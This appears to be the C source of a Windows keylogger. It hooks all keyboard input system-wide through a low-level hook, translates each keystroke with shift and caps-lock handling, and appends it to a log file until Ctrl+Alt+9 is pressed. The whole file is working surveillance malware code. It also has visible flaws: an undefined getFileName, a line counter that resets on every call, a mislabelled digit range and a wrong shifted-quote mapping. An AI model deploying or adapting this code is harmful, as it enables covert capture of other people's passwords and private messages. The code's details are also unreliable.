#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdbool.h>

#define VK_VOLUME_MUTE 0xAD
#define VK_VOLUME_DOWN 0xAE
#define VK_VOLUME_UP 0xAF

int isCapsLock(void)
{
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

void log(char s1[])
{
    FILE* file = fopen(getFileName(), "a+");
    int i = 0;
    fputs(s1, file);
    i++;
    if (i == 50)
    {
        fputc('\n', file);
        i = 0;
    }
    fclose(file);
}

/* An application-defined callback function used with the SetWindowsHookEx function.
 The system calls this function every time a new keyboard input event is about to be posted into a thread input queue.
 1st Parameter  nCode - A code the hook procedure uses to determine how to process the message.
 2nd Parameter wParam - The identifier of the keyboard message. This parameter can be one of the
 following messages: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
 3rd Parameter lParam: A pointer to a KBDLLHOOKSTRUCT structure.
 */
LRESULT CALLBACK
LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    /* This structure contains information about a low-level keyboard input like virtual code, scan code, flags,
     time stamp and additional information associated with the message.
     */
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;
    char val[5];
    DWORD dwMsg = 1;
    switch (wParam)
    {

    case WM_KEYDOWN: // When the key has been pressed. Changed from WM_KEYUP to catch multiple strokes.
    {
        // Assign virtual key code to local variable
        DWORD vkCode = pKeyBoard->vkCode;

        if ((vkCode >= 39) && (vkCode <= 64)) // Keys 0-9
        {
            // TODO fix to shift key HELD down
            if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
            {
                switch (vkCode)
                // 0x30-0x39 is 0-9 respectively
                {
                case 0x30:
                    log(")");
                    break;
                case 0x31:
                    log("!");
                    break;
                case 0x32:
                    log("@");
                    break;
                case 0x33:
                    log("#");
                    break;
                case 0x34:
                    log("$");
                    break;
                case 0x35:
                    log("%");
                    break;
                case 0x36:
                    log("^");
                    break;
                case 0x37:
                    log("&");
                    break;
                case 0x38:
                    log("*");
                    break;
                case 0x39:
                    log("(");
                    break;
                }
            }
            else // If shift key is not down
            {
                sprintf(val, "%c", vkCode);
                log(val);
            }
        }
        else if ((vkCode > 64) && (vkCode < 91)) // Keys a-z
        {
            /*
             The following is a complicated statement to check if the letters need to be switched to lowercase.
             Here is an explanation of why the exclusive or (XOR) must be used.

             Shift   Caps    LowerCase    UpperCase
             T       T       T            F
             T       F       F            T
             F       T       F            T
             F       F       T            F

             The above truth table shows what case letters are typed in,
             based on the state of the shift and caps lock key combinations.

             The UpperCase column is the same result as a logical XOR.
             However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
             Becuase, NOT(XOR) would give us the LowerCase column results.
             */
            if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase
            {
                vkCode += 32; // Un-capitalize letters
            }
            sprintf(val, "%c", vkCode);
            log(val);
        }
        else // Every other key
        {
            switch (vkCode)
            // Check for other keys
            {
            case VK_CANCEL:
                log("[Cancel]");
                break;
            case VK_SPACE:
                log(" ");
                break;
            case VK_LCONTROL:
                log("[LCtrl]");
                break;
            case VK_RCONTROL:
                log("[RCtrl]");
                break;
            case VK_LMENU:
                log("[LAlt]");
                break;
            case VK_RMENU:
                log("[RAlt]");
                break;
            case VK_LWIN:
                log("[LWindows]");
                break;
            case VK_RWIN:
                log("[RWindows]");
                break;
            case VK_APPS:
                log("[Applications]");
                break;
            case VK_SNAPSHOT:
                log("[PrintScreen]");
                break;
            case VK_INSERT:
                log("[Insert]");
                break;
            case VK_PAUSE:
                log("[Pause]");
                break;
            case VK_VOLUME_MUTE:
                log("[VolumeMute]");
                break;
            case VK_VOLUME_DOWN:
                log("[VolumeDown]");
                break;
            case VK_VOLUME_UP:
                log("[VolumeUp]");
                break;
            case VK_SELECT:
                log("[Select]");
                break;
            case VK_HELP:
                log("[Help]");
                break;
            case VK_EXECUTE:
                log("[Execute]");
                break;
            case VK_DELETE:
                log("[Delete]");
                break;
            case VK_CLEAR:
                log("[Clear]");
                break;
            case VK_RETURN:
                log("[Enter]");
                break;
            case VK_BACK:
                log("[Backspace]");
                break;
            case VK_TAB:
                log("[Tab]");
                break;
            case VK_ESCAPE:
                log("[Escape]");
                break;
            case VK_LSHIFT:
                log("[LShift]");
                break;
            case VK_RSHIFT:
                log("[RShift]");
                break;
            case VK_CAPITAL:
                log("[CapsLock]");
                break;
            case VK_NUMLOCK:
                log("[NumLock]");
                break;
            case VK_SCROLL:
                log("[ScrollLock]");
                break;
            case VK_HOME:
                log("[Home]");
                break;
            case VK_END:
                log("[End]");
                break;
            case VK_PLAY:
                log("[Play]");
                break;
            case VK_ZOOM:
                log("[Zoom]");
                break;
            case VK_DIVIDE:
                log("[/]");
                break;
            case VK_MULTIPLY:
                log("[*]");
                break;
            case VK_SUBTRACT:
                log("[-]");
                break;
            case VK_ADD:
                log("[+]");
                break;
            case VK_PRIOR:
                log("[PageUp]");
                break;
            case VK_NEXT:
                log("[PageDown]");
                break;
            case VK_LEFT:
                log("[LArrow]");
                break;
            case VK_RIGHT:
                log("[RArrow]");
                break;
            case VK_UP:
                log("[UpArrow]");
                break;
            case VK_DOWN:
                log("[DownArrow]");
                break;
            case VK_NUMPAD0:
                log("[0]");
                break;
            case VK_NUMPAD1:
                log("[1]");
                break;
            case VK_NUMPAD2:
                log("[2]");
                break;
            case VK_NUMPAD3:
                log("[3]");
                break;
            case VK_NUMPAD4:
                log("[4]");
                break;
            case VK_NUMPAD5:
                log("[5]");
                break;
            case VK_NUMPAD6:
                log("[6]");
                break;
            case VK_NUMPAD7:
                log("[7]");
                break;
            case VK_NUMPAD8:
                log("[8]");
                break;
            case VK_NUMPAD9:
                log("[9]");
                break;
            case VK_F1:
                log("[F1]");
                break;
            case VK_F2:
                log("[F2]");
                break;
            case VK_F3:
                log("[F3]");
                break;
            case VK_F4:
                log("[F4]");
                break;
            case VK_F5:
                log("[F5]");
                break;
            case VK_F6:
                log("[F6]");
                break;
            case VK_F7:
                log("[F7]");
                break;
            case VK_F8:
                log("[F8]");
                break;
            case VK_F9:
                log("[F9]");
                break;
            case VK_F10:
                log("[F10]");
                break;
            case VK_F11:
                log("[F11]");
                break;
            case VK_F12:
                log("[F12]");
                break;
            case VK_F13:
                log("[F13]");
                break;
            case VK_F14:
                log("[F14]");
                break;
            case VK_F15:
                log("[F15]");
                break;
            case VK_F16:
                log("[F16]");
                break;
            case VK_F17:
                log("[F17]");
                break;
            case VK_F18:
                log("[F18]");
                break;
            case VK_F19:
                log("[F19]");
                break;
            case VK_F20:
                log("[F20]");
                break;
            case VK_F21:
                log("[F21]");
                break;
            case VK_F22:
                log("[F22]");
                break;
            case VK_F23:
                log("[F23]");
                break;
            case VK_F24:
                log("[F24]");
                break;
            case VK_OEM_2:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("?");
                else
                    log("/");
                break;
            case VK_OEM_3:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("~");
                else
                    log("`");
                break;
            case VK_OEM_4:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("{");
                else
                    log("[");
                break;
            case VK_OEM_5:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("|");
                else
                    log("\\");
                break;
            case VK_OEM_6:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("}");
                else
                    log("]");
                break;
            case VK_OEM_7:
                if (GetAsyncKeyState(VK_SHIFT))
                    log("\\");
                else
                    log("'");
                break;
                break;
            case 0xBC:                //comma
                if (GetAsyncKeyState(VK_SHIFT))
                    log("<");
                else
                    log(",");
                break;
            case 0xBE:              //Period
                if (GetAsyncKeyState(VK_SHIFT))
                    log(">");
                else
                    log(".");
                break;
            case 0xBA:              //Semi Colon same as VK_OEM_1
                if (GetAsyncKeyState(VK_SHIFT))
                    log(":");
                else
                    log(";");
                break;
            case 0xBD:              //Minus
                if (GetAsyncKeyState(VK_SHIFT))
                    log("_");
                else
                    log("-");
                break;
            case 0xBB:              //Equal
                if (GetAsyncKeyState(VK_SHIFT))
                    log("+");
                else
                    log("=");
                break;
            default:

                /* For More details refer this link http://msdn.microsoft.com/en-us/library/ms646267
                 As mentioned in document of GetKeyNameText http://msdn.microsoft.com/en-us/library/ms646300
                 Scon code is present in 16..23 bits therefor I shifted the code to correct position
                 Same for Extended key flag
                 */
                dwMsg += pKeyBoard->scanCode << 16;
                dwMsg += pKeyBoard->flags << 24;

                char key[16];
                /* Retrieves a string that represents the name of a key.
                 1st Parameter dwMsg contains the scan code and Extended flag
                 2nd Parameter lpString: lpszName - The buffer that will receive the key name.
                 3rd Parameter cchSize: The maximum length, in characters, of the key name, including the terminating null character
                 If the function succeeds, a null-terminated string is copied into the specified buffer,
                 and the return value is the length of the string, in characters, not counting the terminating null character.
                 If the function fails, the return value is zero.
                 */
                GetKeyNameText(dwMsg, key, 15);
                log(key);
            }
        }
        break;
    }
    default:

        /* Passes the hook information to the next hook procedure in the current hook chain.
         1st Parameter hhk - Optional
         2nd Parameter nCode - The next hook procedure uses this code to determine how to process the hook information.
         3rd Parameter wParam - The wParam value passed to the current hook procedure.
         4th Parameter lParam - The lParam value passed to the current hook procedure
         */
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    return 0;
}

// Function called by main function to install hook
DWORD WINAPI
KeyLogger(LPVOID lpParameter)
{

    HHOOK hKeyHook;
    /* Retrieves a module handle for the specified module.
     parameter is NULL, GetModuleHandle returns a handle to the file used to create the calling process (.exe file).
     If the function succeeds, the return value is a handle to the specified module.
     If the function fails, the return value is NULL.
     */
    HINSTANCE hExe = GetModuleHandle(NULL);

    if (!hExe)
    {
        return 1;
    }
    else
    {
        /*Installs an application-defined hook procedure into a hook chain
         1st Parameter idHook: WH_KEYBOARD_LL - The type of hook procedure to be installed
         Installs a hook procedure that monitors low-level keyboard input events.
         2nd Parameter lpfn: LowLevelKeyboardProc - A pointer to the hook procedure.
         3rd Parameter hMod: hExe - A handle to the DLL containing the hook procedure pointed to by the lpfn parameter.
         4th Parameter dwThreadId: 0 - the hook procedure is associated with all existing threads running
         If the function succeeds, the return value is the handle to the hook procedure.
         If the function fails, the return value is NULL.
         */
        hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC) LowLevelKeyboardProc, hExe, 0);

        /*Defines a system-wide hot key of alt+ctrl+9
         1st Parameter hWnd(optional) :NULL - A handle to the window that will receive hot key message generated by hot key.
         2nd Parameter id:1 - The identifier of the hot key
         3rd Parameter fsModifiers: MOD_ALT | MOD_CONTROL -  The keys that must be pressed in combination with the key
         specified by the uVirtKey parameter in order to generate the WM_HOTKEY message.
         4th Parameter vk: 0x39(9) - The virtual-key code of the hot key
         */
        RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);

        MSG msg;

        // Message loop retrieves messages from the thread's message queue and dispatches them to the appropriate window procedures.
        // For more info http://msdn.microsoft.com/en-us/library/ms644928%28v=VS.85%29.aspx#creating_loop
        //Retrieves a message from the calling thread's message queue.

        while (GetMessage(&msg, NULL, 0, 0) != 0)
        {
            // if Hot key combination is pressed then exit
            if (msg.message == WM_HOTKEY)
            {
                UnhookWindowsHookEx(hKeyHook);
                return 0;
            }
            //Translates virtual-key messages into character messages.
            TranslateMessage(&msg);
            //Dispatches a message to a window procedure.
            DispatchMessage(&msg);
        }

        /* To free system resources associated with the hook and removes a hook procedure installed in a hook chain
         Parameter hhk: hKeyHook - A handle to the hook to be removed.
         */
        UnhookWindowsHookEx(hKeyHook);
    }
    return 0;
}

int start(char* argv[])
{
    HANDLE hThread;

    /* CreateThread function Creates a thread to execute within the virtual address space of the calling process.
     1st Parameter lpThreadAttributes:  NULL - Thread gets a default security descriptor.
     2nd Parameter dwStackSize:  0  - The new thread uses the default size for the executable.
     3rd Parameter lpStartAddress:  KeyLogger - A pointer to the application-defined function to be executed by the thread
     4th Parameter lpParameter:  argv[0] -  A pointer to a variable to be passed to the thread
     5th Parameter dwCreationFlags: 0 - The thread runs immediately after creation.
     6th Parameter pThreadId(out parameter): NULL - the thread identifier is not returned
     If the function succeeds, the return value is a handle to the new thread.
     */

    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) KeyLogger,
            (LPVOID) argv[0], 0, NULL );

    if (hThread)
    {
        // Waits until the specified object is in the signaled state or the time-out interval elapses.
        return WaitForSingleObject(hThread, INFINITE);
    }
    return 1;
}
